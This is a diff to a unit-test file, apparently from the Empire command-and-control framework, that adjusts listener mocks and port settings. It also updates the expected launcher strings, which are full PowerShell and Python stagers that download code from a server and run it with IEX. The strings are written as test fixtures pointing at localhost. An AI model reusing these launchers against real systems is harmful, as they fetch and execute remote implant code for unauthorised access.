+++ empire/test/test_listener_generate_launcher.py
@@ -39,6 +39,8 @@ def test_http_generate_launcher(monkeypatch, main_menu_mock):
 
     http_listener.options["Cookie"]["Value"] = "l33th4x0r"
     http_listener.options["Host"]["Value"] = "http://localhost"
+    http_listener.options["Port"]["Value"] = "80"
+    http_listener.host_address = "http://localhost/"
     main_menu_mock.listeners.activeListeners = {
         "fake_listener": {"options": http_listener.options}
     }
@@ -69,10 +71,19 @@ def test_http_foreign_generate_launcher(monkeypatch, main_menu_mock):
     http_foreign_listener = Listener(main_menu_mock)
 
     http_foreign_listener.options["Host"]["Value"] = "http://localhost"
+    http_foreign_listener.options["Port"]["Value"] = "80"
     http_foreign_listener.options["RoutingPacket"]["Value"] = "cm91dGluZyBwYWNrZXQ="
+    http_foreign_listener.host_address = "http://localhost/"
     main_menu_mock.listeners.activeListeners = {
         "fake_listener": {"options": http_foreign_listener.options}
     }
+
+    validate_listener_address_mock = MagicMock()
+    validate_listener_address_mock.return_value = ("http://localhost/", None)
+    main_menu_mock.listenersv2 = MagicMock()
+    main_menu_mock.listenersv2.validate_listener_address = (
+        validate_listener_address_mock
+    )
 
     http_foreign_listener.threads = {"fake_listener": {"fake_thread": {}}}
 
@@ -105,6 +116,8 @@ def test_http_hop_generate_launcher(monkeypatch, main_menu_mock):
     http_hop_listener = Listener(main_menu_mock)
 
     http_hop_listener.options["Host"]["Value"] = "http://localhost"
+    http_hop_listener.options["Port"]["Value"] = "80"
+    http_hop_listener.host_address = "http://localhost/"
     http_hop_listener.options["DefaultProfile"]["Value"] = (
         "/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"
     )
@@ -112,9 +125,14 @@ def test_http_hop_generate_launcher(monkeypatch, main_menu_mock):
         "fake_listener": {"options": http_hop_listener.options}
     }
     http_hop_listener.session_cookie = "session"
-    main_menu_mock.listenersv2.get_active_listener_by_name.return_value = (
-        http_hop_listener
-    )
+
+    # create listenersv2 mock and set both methods on the SAME instance
+    listenersv2 = MagicMock()
+    listenersv2.get_active_listener_by_name.return_value = http_hop_listener
+    listenersv2.validate_listener_address.return_value = ("http://localhost/", None)
+
+    # attach to main_menu_mock
+    main_menu_mock.listenersv2 = listenersv2
 
     http_hop_listener.threads = {"fake_listener": {"fake_thread": {}}}
 
@@ -159,11 +177,20 @@ def test_http_malleable_generate_launcher(monkeypatch, main_menu_mock):
         "empire.server.listeners.http_malleable.SessionLocal", session_mock
     )
 
+    validate_listener_address_mock = MagicMock()
+    validate_listener_address_mock.return_value = ("http://localhost/", None)
+    main_menu_mock.listenersv2 = MagicMock()
+    main_menu_mock.listenersv2.validate_listener_address = (
+        validate_listener_address_mock
+    )
+
     http_malleable_listener = Listener(main_menu_mock)
     http_malleable_listener.options["Profile"]["Value"] = "amazon.profile"
     http_malleable_listener.validate_options()
 
     http_malleable_listener.options["Host"]["Value"] = "http://localhost"
+    http_malleable_listener.options["Port"]["Value"] = "80"
+
     main_menu_mock.listeners.activeListeners = {
         "fake_listener": {"options": http_malleable_listener.options}
     }
@@ -238,6 +265,16 @@ def test_port_forward_pivot_generate_launcher(monkeypatch, main_menu_mock):
     # redirector doesn't get these fields until the listener is started.
     port_forward_pivot.options.update(HttpListener(main_menu_mock).options)
     port_forward_pivot.options["Host"] = {"Value": "http://localhost"}
+    port_forward_pivot.options["Port"] = {"Value": "80"}
+    port_forward_pivot.host_address = "http://localhost/"
+
+    validate_listener_address_mock = MagicMock()
+    validate_listener_address_mock.return_value = ("http://localhost/", None)
+    main_menu_mock.listenersv2 = MagicMock()
+    main_menu_mock.listenersv2.validate_listener_address = (
+        validate_listener_address_mock
+    )
+
     main_menu_mock.listeners.activeListeners = {
         "fake_listener": {"options": port_forward_pivot.options}
     }
@@ -258,7 +295,7 @@ def test_port_forward_pivot_generate_launcher(monkeypatch, main_menu_mock):
 
 
 def _expected_http_powershell_launcher():
-    return """$ErrorActionPreference = "SilentlyContinue";$wc=New-Object System.Net.WebClient;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$ser=$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwBsAG8AYwBhAGwAaABvAHMAdAA=')));$t='/admin/get.php';$wc.Headers.Add('User-Agent',$u);$wc.Proxy=[System.Net.WebRequest]::DefaultWebProxy;$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;$Script:Proxy = $wc.Proxy;$K=[System.Text.Encoding]::ASCII.GetBytes(\'@3uiSPNG;mz|{5#1tKCHDZ*dFs87~g,}\');$wc.Headers.Add("Cookie","l33th4x0r=cm91dGluZyBwYWNrZXQ=");$data=$wc.DownloadData($ser+$t);IEX ([Text.Encoding]::UTF8.GetString($data))"""
+    return """$ErrorActionPreference = "SilentlyContinue";$wc=New-Object System.Net.WebClient;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$ser=$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwBsAG8AYwBhAGwAaABvAHMAdAAvAA==')));$t='/admin/get.php';$wc.Headers.Add('User-Agent',$u);$wc.Proxy=[System.Net.WebRequest]::DefaultWebProxy;$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;$Script:Proxy = $wc.Proxy;$K=[System.Text.Encoding]::ASCII.GetBytes(\'@3uiSPNG;mz|{5#1tKCHDZ*dFs87~g,}\');$wc.Headers.Add("Cookie","l33th4x0r=cm91dGluZyBwYWNrZXQ=");$data=$wc.DownloadData($ser+$t);IEX ([Text.Encoding]::UTF8.GetString($data))"""
 
 
 def _expected_http_python_launcher():
@@ -266,7 +303,7 @@ def _expected_http_python_launcher():
         """
         import sys;
         import urllib.request;
-        UA='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';server='http://localhost';t='/admin/get.php';
+        UA='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';server='http://localhost/';t='/admin/get.php';
         req=urllib.request.Request(server+t);
         proxy = urllib.request.ProxyHandler();
         o = urllib.request.build_opener(proxy);
@@ -279,7 +316,7 @@ def _expected_http_python_launcher():
 
 
 def _expected_http_foreign_powershell_launcher():
-    return """$ErrorActionPreference = "SilentlyContinue";$wc=New-Object System.Net.WebClient;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wc.Headers.Add('User-Agent',$u);$wc.Proxy=[System.Net.WebRequest]::DefaultWebProxy;$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;$K=[System.Text.Encoding]::ASCII.GetBytes('@3uiSPNG;mz|{5#1tKCHDZ*dFs87~g,}');$wc.Headers.Add("Cookie","session=cm91dGluZyBwYWNrZXQ=");$ser= $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwBsAG8AYwBhAGwAaABvAHMAdAA=')));$t='/admin/get.php';$data=$wc.DownloadData($ser+$t);IEX ([Text.Encoding]::UTF8.GetString($data))"""
+    return """$ErrorActionPreference = "SilentlyContinue";$wc=New-Object System.Net.WebClient;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wc.Headers.Add('User-Agent',$u);$wc.Proxy=[System.Net.WebRequest]::DefaultWebProxy;$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;$K=[System.Text.Encoding]::ASCII.GetBytes('@3uiSPNG;mz|{5#1tKCHDZ*dFs87~g,}');$wc.Headers.Add("Cookie","session=cm91dGluZyBwYWNrZXQ=");$ser= $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwBsAG8AYwBhAGwAaABvAHMAdAAvAA==')));$t='/admin/get.php';$data=$wc.DownloadData($ser+$t);IEX ([Text.Encoding]::UTF8.GetString($data))"""
 
 
 def _expected_http_foreign_python_launcher():
@@ -288,7 +325,7 @@ def _expected_http_foreign_python_launcher():
         import sys;
         o=__import__({2:'urllib2',3:'urllib.request'}[sys.version_info[0]],fromlist=['build_opener']).build_opener();
         UA='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';
-        server='http://localhost';t='/admin/get.php';
+        server='http://localhost/';t='/admin/get.php';
         o.addheaders=[('User-Agent',UA), ("Cookie", "session=cm91dGluZyBwYWNrZXQ=")];
         import urllib.request;
         proxy = urllib.request.ProxyHandler();
@@ -305,7 +342,7 @@ def _expected_http_hop_python_launcher():
         """
         import sys;
         import urllib.request;
-        UA='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';server='http://localhost';t='/admin/get.php';hop='fake_listener';
+        UA='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';server='http://localhost/';t='/admin/get.php';hop='fake_listener';
         req=urllib.request.Request(server+t);
         proxy = urllib.request.ProxyHandler();
         o = urllib.request.build_opener(proxy);
@@ -318,7 +355,7 @@ def _expected_http_hop_python_launcher():
 
 
 def _expected_http_hop_powershell_launcher():
-    return """$ErrorActionPreference = "SilentlyContinue";$wc=New-Object System.Net.WebClient;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wc.Headers.Add('User-Agent',$u);$wc.Proxy=[System.Net.WebRequest]::DefaultWebProxy;$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;$K=[System.Text.Encoding]::ASCII.GetBytes('');$wc.Headers.Add("Cookie","session=cm91dGluZyBwYWNrZXQ=");$ser=$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwBsAG8AYwBhAGwAaABvAHMAdAA=')));$t='/admin/get.php';$hop='fake_listener';$data=$wc.DownloadData($ser+$t);IEX ([Text.Encoding]::UTF8.GetString($data))"""
+    return """$ErrorActionPreference = "SilentlyContinue";$wc=New-Object System.Net.WebClient;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wc.Headers.Add('User-Agent',$u);$wc.Proxy=[System.Net.WebRequest]::DefaultWebProxy;$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;$K=[System.Text.Encoding]::ASCII.GetBytes('');$wc.Headers.Add("Cookie","session=cm91dGluZyBwYWNrZXQ=");$ser=$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwBsAG8AYwBhAGwAaABvAHMAdAAvAA==')));$t='/admin/get.php';$hop='fake_listener';$data=$wc.DownloadData($ser+$t);IEX ([Text.Encoding]::UTF8.GetString($data))"""
 
 
 def _expected_http_malleable_python_launcher():
@@ -326,7 +363,7 @@ def _expected_http_malleable_python_launcher():
         """
         import sys,base64
         import urllib.request,urllib.parse
-        server='http://localhost'
+        server='http://localhost/'
         proxy = urllib.request.ProxyHandler()
         o = urllib.request.build_opener(proxy)
         urllib.request.install_opener(o)
@@ -439,7 +476,7 @@ def _expected_redirector_python_launcher():
     return dedent(
         """
         import sys;import urllib.request;
-        UA='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';server='http://localhost';t='/admin/get.php';req=urllib.request.Request(server+t);
+        UA='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';server='http://localhost/';t='/admin/get.php';req=urllib.request.Request(server+t);
         req.add_header('User-Agent',UA);
         req.add_header('Cookie',"session=cm91dGluZyBwYWNrZXQ=");
         proxy = urllib.request.ProxyHandler();
@@ -452,4 +489,4 @@ def _expected_redirector_python_launcher():
 
 
 def _expected_redirector_powershell_launcher():
-    return """$ErrorActionPreference = "SilentlyContinue";$wc=New-Object System.Net.WebClient;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wc.Headers.Add('User-Agent',$u);$wc.Proxy=[System.Net.WebRequest]::DefaultWebProxy;$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;$Script:Proxy = $wc.Proxy;$K=[System.Text.Encoding]::ASCII.GetBytes('@3uiSPNG;mz|{5#1tKCHDZ*dFs87~g,}');$ser=$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwBsAG8AYwBhAGwAaABvAHMAdAA=')));$t='/admin/get.php';$hop='fake_listener';$wc.Headers.Add("Cookie","session=cm91dGluZyBwYWNrZXQ=");$data=$wc.DownloadData($ser+$t);$iv=$data[0..3];$data=$data[4..$data.length];-join[Char[]](& $R $data ($IV+$K))|IEX"""
+    return """$ErrorActionPreference = "SilentlyContinue";$wc=New-Object System.Net.WebClient;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wc.Headers.Add('User-Agent',$u);$wc.Proxy=[System.Net.WebRequest]::DefaultWebProxy;$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;$Script:Proxy = $wc.Proxy;$K=[System.Text.Encoding]::ASCII.GetBytes('@3uiSPNG;mz|{5#1tKCHDZ*dFs87~g,}');$ser=$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwBsAG8AYwBhAGwAaABvAHMAdAAvAA==')));$t='/admin/get.php';$hop='fake_listener';$wc.Headers.Add("Cookie","session=cm91dGluZyBwYWNrZXQ=");$data=$wc.DownloadData($ser+$t);$iv=$data[0..3];$data=$data[4..$data.length];-join[Char[]](& $R $data ($IV+$K))|IEX"""